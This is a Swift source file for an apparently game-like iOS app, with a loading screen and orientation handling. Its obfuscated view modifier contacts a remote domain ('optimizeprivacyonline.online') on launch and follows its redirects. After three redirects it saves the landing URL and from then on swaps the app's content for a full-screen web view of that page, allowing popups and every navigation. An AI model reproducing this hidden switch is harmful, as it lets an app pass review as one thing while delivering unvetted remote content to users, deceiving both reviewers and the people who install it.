//
//  Iub.swift
//  Soldieoqzaqsbt
//
//  Created by Nicolae Chivriga on 18/02/2025.
//


import SwiftUI
import Lottie

struct Iub: View {
    @State var niog: Bool = false
    var body: some View {
        ZStack {
            NavigationLink("", destination: SuiqobqaxzView(), isActive: $niog)
            Image("soqi9nshq")
                .resizable()
                .ignoresSafeArea()
            
            Color.black.opacity(0.35)
                .ignoresSafeArea()
            
            LottieView(animation: .named("siqiopbpaxbu"))
                .playing(loopMode: .loop)
                .resizable()
                .frame(width: 75, height: 75)

            VStack {
                Spacer()
                HStack {
                    Spacer()
                    Sgqdnhaq()
                }
                .onAppear() {
                    DispatchQueue.main.asyncAfter(deadline: .now() + 3.5) {
                        niog = true 
                    }
                }
            }
            .padding()
        }
        .ijzbrter()
    }
}

class AppDelegate: NSObject, UIApplicationDelegate {
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.imbyqz
    }
    static var imbyqz = UIInterfaceOrientationMask.landscape {
        didSet {
            if #available(iOS 16.0, *) {
                UIApplication.shared.connectedScenes.forEach { scene in
                    if let windowScene = scene as? UIWindowScene {
                        windowScene.requestGeometryUpdate(.iOS(interfaceOrientations: imbyqz))
                    }
                }
                UIViewController.attemptRotationToDeviceOrientation()
            } else {
                if imbyqz == .landscape {
                    UIDevice.current.setValue(UIInterfaceOrientation.landscapeRight.rawValue, forKey: "orientation")
                } else {
                    UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                }
            }
        }
    }
    
  
}
import SwiftUI

struct Sgqdnhaq: View {
    @State private var bnhjweq = false
    @State private var glow = false
    
    var body: some View {
        ZStack {
//            Color.black.ignoresSafeArea()
            
            VStack {
//                HStack(spacing: -30) {
//                    Sihuqnbnpyiqusn()
//                        .rotationEffect(.degrees(bnhjweq ? 360 : 0))
//                        .animation(Animation.linear(duration: 2).repeatForever(autoreverses: false), value: bnhjweq)
//                    
//                    Sihuqnbnpyiqusn()
//                        .rotationEffect(.degrees(bnhjweq ? -360 : 0))
//                        .animation(Animation.linear(duration: 2).repeatForever(autoreverses: false), value: bnhjweq)
//                }
//                .padding(.bottom, 50)
                
                Text("Loading...")
                    .font(.system(size: 40, weight: .bold, design: .rounded))
                    .foregroundColor(.white)
                    .shadow(color: glow ? .yellow : .clear, radius: 10)
                    .animation(Animation.easeInOut(duration: 0.8).repeatForever(autoreverses: true), value: glow)
            }
        }
        .onAppear {
            bnhjweq = true
            glow = true
        }
    }
}

struct Sihuqnbnpyiqusn: View {
    var body: some View {
        Circle()
            .fill(LinearGradient(gradient: Gradient(colors: [.red, .white]), startPoint: .top, endPoint: .bottom))
            .frame(width: 80, height: 80)
            .overlay(
                Circle().stroke(Color.white, lineWidth: 5)
            )
            .shadow(radius: 5)
    }
}


import WebKit
struct Poiuwqbkzidtuqaz: ViewModifier {

    
    @AppStorage("adapt") var aqrbwarIuqnbasw: URL?
    
    @State var qusbtozbqe: Bool = true

    @State var webView: WKWebView = WKWebView()
    
    func body(content: Content) -> some View {
        ZStack {
            
            if !qusbtozbqe {
                
                if aqrbwarIuqnbasw != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: aqrbwarIuqnbasw!)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: aqrbwarIuqnbasw!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        AppDelegate.imbyqz = .all
                    }
                    .modifier(Swipsortba(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        .onAppear() {
            if aqrbwarIuqnbasw == nil {
                checkpesk()
            } else {
                qusbtozbqe = false
            }
        }
    }

    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
           
                redirects1 += 1
                if redirects1 >= 3 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func checkpesk() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/xuiaopracasr") else {
            DispatchQueue.main.async {
                self.qusbtozbqe = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            aqrbwarIuqnbasw = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.qusbtozbqe = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.qusbtozbqe = false
                }
            }

            DispatchQueue.main.async {
                self.qusbtozbqe = false
            }
        }.resume()
    }
}

@preconcurrency import WebKit
import SwiftUI

struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView

    var url: URL
    var webView: WKWebView
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(), onLoadCompletion: (() -> Void)? = nil) {
        self.url = url
        self.webView = webView
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}

// MARK: - Coordinator
extension WKWebViewRepresentable {
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: WKWebViewRepresentable
        private var popupWebViews: [WKWebView] = []

        init(_ parent: WKWebViewRepresentable) {
            self.parent = parent
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            // Handle popup windows
            guard navigationAction.targetFrame == nil else {
                return nil
            }

            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self

            parent.webView.addSubview(popupWebView)

            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: parent.webView.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: parent.webView.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: parent.webView.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: parent.webView.trailingAnchor)
            ])

            popupWebViews.append(popupWebView)
            return popupWebView
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Notify when the main page finishes loading
            parent.onLoadCompletion?()
            parent.webView.layer.opacity = 1 // Reveal the webView
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            decisionHandler(.allow)
        }

        func webViewDidClose(_ webView: WKWebView) {
            // Cleanup closed popup WebViews
            popupWebViews.removeAll { $0 == webView }
            webView.removeFromSuperview()
        }
    }
}
